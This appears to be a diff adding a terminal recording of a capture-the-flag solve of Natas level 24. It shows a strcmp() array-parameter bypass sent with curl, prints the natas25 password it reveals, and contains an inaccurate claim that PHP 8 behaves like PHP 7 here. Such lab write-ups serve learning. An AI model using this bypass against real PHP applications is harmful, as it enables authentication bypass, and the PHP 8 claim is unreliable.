@@ -1,0 +1,9 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793509280,"idle_time_limit":2.0,"command":"bash /home/claude/solves/natas/L24.sh","title":"Natas L24 -> natas25: pass an array to strcmp() so it returns NULL and !NULL passes","env":{"SHELL":"/bin/bash"}}
+[0.002, "o", "$ curl -s -u natas24:<pw> http://natas24.natas.labs.overthewire.org/index-source.html\r\n$   source: if(!strcmp($_REQUEST[\"passwd\"],\"<censored>\")) print credentials\r\n"]
+[0.404, "o", "if(!strcmp($_REQUEST[\"passwd\"],\"<censored>\")){            echo \"<br>The credentials for the next level are:<br>\";            echo \"<pre>Username: natas25 Password: <censored></pre>\";        }\r\n"]
+[0.001, "o", "$ strcmp() wants strings. If passwd is an ARRAY, PHP 7/8 raises a warning and\r\n$   strcmp() returns NULL -> !NULL is true -> the check passes.\r\n$   PHP does NOT abort on the warning, so execution continues into the branch.\r\n$ curl -s -u natas24:<pw> 'http://natas24.natas.labs.overthewire.org/?passwd=x'\r\n"]
+[0.381, "o", "Password:\r\nWrong!  \r\n"]
+[0.000, "o", "$ curl -s -u natas24:<pw> 'http://natas24.natas.labs.overthewire.org/?passwd[]=x'\r\n"]
+[0.379, "o", "Password:\r\nWarning:  strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23\r\nThe credentials for the next level are:Username: natas25 Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo  \r\n"]
+[0.000, "o", "$ verify: curl -u natas25:<pw> http://natas25.natas.labs.overthewire.org/ -> 200\r\n"]
+[0.001, "x", "0"]
